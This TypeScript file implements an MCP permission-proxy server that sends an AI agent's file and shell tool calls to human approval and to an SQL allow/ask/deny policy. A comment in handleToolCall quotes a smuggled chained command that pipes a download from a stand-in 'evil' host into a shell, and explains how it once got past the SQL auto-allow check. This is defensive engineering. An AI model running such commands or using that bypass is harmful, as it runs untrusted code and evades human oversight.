#!/usr/bin/env node
/**
 * Permission proxy MCP server — used by the agent-sdk driver.
 *
 * Exposes write_file, edit_file, and bash tools that gate every operation
 * through the swarm server's permission system before executing.
 *
 * Scope (be precise — this is a permission boundary, not a blanket guarantee):
 * this proxy is attached ONLY to hired marketplace specialists whose grants
 * carry mode:'ask' or an SQL policy (assembleSpecialistTools in agent-sdk.ts).
 * The BUILT-IN coder runs with the native Write/Edit/Bash tools un-proxied by
 * design — its guardrails are the worktree + gates, not this broker.
 *
 * Communication:
 *   POST {SWARM_SERVER_URL}/run/permission/request  →  long-poll until decided
 *   responds with { decision: 'allow' | 'deny' }
 *
 * Environment variables (set by agent-sdk.ts at spawn time):
 *   SWARM_SERVER_URL   e.g. http://127.0.0.1:7000
 *   SWARM_AGENT_ID     e.g. t1 (task id used as agent id in the UI)
 *   SWARM_PROJECT_ROOT absolute path to the project being edited
 */

import * as fs from 'node:fs';
import * as fsp from 'node:fs/promises';
import * as path from 'node:path';
import * as readline from 'node:readline';
import { execSync, execFileSync } from 'node:child_process';
import { classifySql, extractSql, analyzeDbCommand, policyFor } from './sql-guard.js';

const serverUrl = process.env.SWARM_SERVER_URL ?? 'http://127.0.0.1:7000';
const agentId = process.env.SWARM_AGENT_ID ?? 'unknown';
const projectRoot = process.env.SWARM_PROJECT_ROOT ?? process.cwd();

// SQL operation policy: maps category → 'allow' | 'ask' | 'deny'.
// Set by agent-sdk when the agent has sqlCategory tools.
const sqlPolicy: Record<string, 'allow' | 'ask' | 'deny'> = (() => {
  try {
    return JSON.parse(process.env.SWARM_SQL_POLICY ?? '{}');
  } catch {
    return {};
  }
})();

// ─── SQL classification ───────────────────────────────────────────────────────
// Pure logic lives in sql-guard.ts (unit-tested). This file only wires it to
// the permission flow.

// ─── Safety ───────────────────────────────────────────────────────────────────

function safeJoin(rel: string): string {
  const abs = path.resolve(projectRoot, rel);
  if (abs !== projectRoot && !abs.startsWith(projectRoot + path.sep))
    throw new Error(`Path outside project root: ${rel}`);
  return abs;
}

// ─── Permission gate ──────────────────────────────────────────────────────────

async function askPermission(
  tool: string,
  input: Record<string, unknown>,
): Promise<'allow' | 'deny'> {
  const body = JSON.stringify({ agent_id: agentId, tool, input });
  try {
    const res = await fetch(`${serverUrl}/run/permission/request`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body,
      // Long-poll — the server holds the connection open until the user decides.
      // signal: AbortSignal.timeout(11 * 60 * 1000)  (11 min — just beyond the broker's 10 min auto-deny)
    });
    if (!res.ok) return 'deny';
    const json = (await res.json()) as { decision?: string };
    return json.decision === 'allow' ? 'allow' : 'deny';
  } catch {
    // If the swarm server is unreachable, fail safe — deny.
    return 'deny';
  }
}

// ─── Tool implementations ─────────────────────────────────────────────────────

async function toolReadFile(input: Record<string, unknown>): Promise<string> {
  const rel = String(input.file_path ?? input.path ?? '');
  const offset = Number(input.offset ?? 0);
  const limit = input.limit !== undefined ? Number(input.limit) : undefined;
  const abs = safeJoin(rel);
  const content = await fsp.readFile(abs, 'utf8');
  const lines = content.split('\n');
  const sliced = limit !== undefined ? lines.slice(offset, offset + limit) : lines.slice(offset);
  return sliced.join('\n');
}

async function toolWriteFile(input: Record<string, unknown>): Promise<string> {
  const rel = String(input.file_path ?? input.path ?? '');
  const content = String(input.content ?? '');
  const abs = safeJoin(rel);
  await fsp.mkdir(path.dirname(abs), { recursive: true });
  await fsp.writeFile(abs, content, 'utf8');
  return `Written: ${rel}`;
}

async function toolEditFile(input: Record<string, unknown>): Promise<string> {
  const rel = String(input.file_path ?? input.path ?? '');
  const oldString = String(input.old_string ?? '');
  const newString = String(input.new_string ?? '');
  const abs = safeJoin(rel);
  if (!fs.existsSync(abs)) return `Error: file not found: ${rel}`;
  const current = await fsp.readFile(abs, 'utf8');
  if (!current.includes(oldString)) {
    return `Error: old_string not found in ${rel}`;
  }
  const updated = current.replace(oldString, newString);
  await fsp.writeFile(abs, updated, 'utf8');
  return `Edited: ${rel}`;
}

function runBash(input: Record<string, unknown>): string {
  const command = String(input.command ?? '');
  try {
    const output = execSync(command, {
      cwd: projectRoot,
      encoding: 'utf8',
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    });
    return output || '(no output)';
  } catch (err) {
    const e = err as { stdout?: string; stderr?: string; message?: string };
    return [e.stdout, e.stderr, e.message].filter(Boolean).join('\n') || 'Command failed';
  }
}

// Run a PROVEN single DB invocation as an argv — no shell, so nothing outside
// the classified SQL can execute. Only ever called with analyzeDbCommand output.
function runDbArgv(argv: string[]): string {
  try {
    const output = execFileSync(argv[0], argv.slice(1), {
      cwd: projectRoot,
      encoding: 'utf8',
      timeout: 120_000,
      maxBuffer: 10 * 1024 * 1024,
    });
    return output || '(no output)';
  } catch (err) {
    const e = err as { stdout?: string; stderr?: string; message?: string };
    return [e.stdout, e.stderr, e.message].filter(Boolean).join('\n') || 'Command failed';
  }
}

// ─── Tool schema ──────────────────────────────────────────────────────────────

const TOOLS = [
  {
    name: 'read_file',
    description: 'Read a file in the project. Requires user approval.',
    inputSchema: {
      type: 'object',
      required: ['file_path'],
      properties: {
        file_path: { type: 'string', description: 'Path relative to project root.' },
        offset: { type: 'number', description: 'Line number to start from.' },
        limit: { type: 'number', description: 'Number of lines to read.' },
      },
    },
  },
  {
    name: 'write_file',
    description: 'Write (create or overwrite) a file in the project. Requires user approval.',
    inputSchema: {
      type: 'object',
      required: ['file_path', 'content'],
      properties: {
        file_path: { type: 'string', description: 'Path relative to project root.' },
        content: { type: 'string', description: 'Full file content.' },
      },
    },
  },
  {
    name: 'edit_file',
    description: 'Edit a file by replacing an exact string. Requires user approval.',
    inputSchema: {
      type: 'object',
      required: ['file_path', 'old_string', 'new_string'],
      properties: {
        file_path: { type: 'string' },
        old_string: { type: 'string', description: 'Exact text to find and replace.' },
        new_string: { type: 'string', description: 'Replacement text.' },
      },
    },
  },
  {
    name: 'bash',
    description: 'Run a shell command in the project directory. Requires user approval.',
    inputSchema: {
      type: 'object',
      required: ['command'],
      properties: {
        command: { type: 'string', description: 'Shell command to execute.' },
      },
    },
  },
];

// ─── MCP JSON-RPC 2.0 over stdio ─────────────────────────────────────────────

function send(obj: unknown): void {
  process.stdout.write(JSON.stringify(obj) + '\n');
}

function ok(id: unknown, result: unknown): void {
  send({ jsonrpc: '2.0', id, result });
}

function err(id: unknown, code: number, message: string): void {
  send({ jsonrpc: '2.0', id, error: { code, message } });
}

const rl = readline.createInterface({ input: process.stdin, terminal: false });

rl.on('line', (line: string) => {
  let msg: { jsonrpc: string; id?: unknown; method: string; params?: unknown };
  try {
    msg = JSON.parse(line);
  } catch {
    return;
  }

  const { id, method, params } = msg;

  if (method === 'initialize') {
    ok(id, {
      protocolVersion: '2024-11-05',
      capabilities: { tools: {} },
      serverInfo: { name: 'swarm-permission-proxy', version: '1.0.0' },
    });
    return;
  }

  if (method === 'notifications/initialized') return;

  if (method === 'tools/list') {
    ok(id, { tools: TOOLS });
    return;
  }

  if (method === 'tools/call') {
    const p = params as { name: string; arguments: Record<string, unknown> };
    handleToolCall(id, p.name, p.arguments ?? {});
    return;
  }

  err(id, -32601, `Method not found: ${method}`);
});

async function handleToolCall(
  id: unknown,
  name: string,
  input: Record<string, unknown>,
): Promise<void> {
  // For bash commands with an SQL policy, try the strict auto path first.
  // AUTO-ALLOW requires proof: the command must parse as a single DB-client
  // invocation with no shell-active syntax, and it then runs as an argv via
  // execFile — never through a shell. The old flow classified a substring but
  // ran the whole original string via /bin/sh, so `psql -c "SELECT 1"; curl
  // evil | sh` auto-ran both halves. Anything unprovable falls through to a
  // human ask; deny policies still catch commands that merely look like SQL.
  if (name === 'bash' && Object.keys(sqlPolicy).length > 0) {
    const command = String(input.command ?? '');
    const analysis = analyzeDbCommand(command);
    if (analysis) {
      const decision = policyFor(analysis.category, sqlPolicy);
      if (decision === 'allow') {
        ok(id, { content: [{ type: 'text', text: runDbArgv(analysis.argv) }], isError: false });
        return;
      }
      if (decision === 'deny') {
        ok(id, {
          content: [
            {
              type: 'text',
              text: `Permission denied: ${analysis.category} SQL operations are not allowed by your policy.`,
            },
          ],
          isError: true,
        });
        return;
      }
      // 'ask' — fall through to the broker.
    } else {
      // Not provably a lone DB command. Deny still applies to anything that
      // sniffs as SQL; everything else goes to the human.
      const sniffed = extractSql(command);
      if (sniffed && policyFor(classifySql(sniffed), sqlPolicy) === 'deny') {
        ok(id, {
          content: [
            {
              type: 'text',
              text: `Permission denied: ${classifySql(sniffed)} SQL operations are not allowed by your policy.`,
            },
          ],
          isError: true,
        });
        return;
      }
    }
  }

  const decision = await askPermission(name, input);

  if (decision === 'deny') {
    ok(id, {
      content: [{ type: 'text', text: `Permission denied: user rejected the ${name} operation.` }],
      isError: true,
    });
    return;
  }

  let result: string;
  try {
    if (name === 'read_file') result = await toolReadFile(input);
    else if (name === 'write_file') result = await toolWriteFile(input);
    else if (name === 'edit_file') result = await toolEditFile(input);
    else if (name === 'bash') result = runBash(input);
    else result = `Unknown tool: ${name}`;
  } catch (e) {
    result = `Error: ${(e as Error).message}`;
  }

  ok(id, { content: [{ type: 'text', text: result }], isError: false });
}
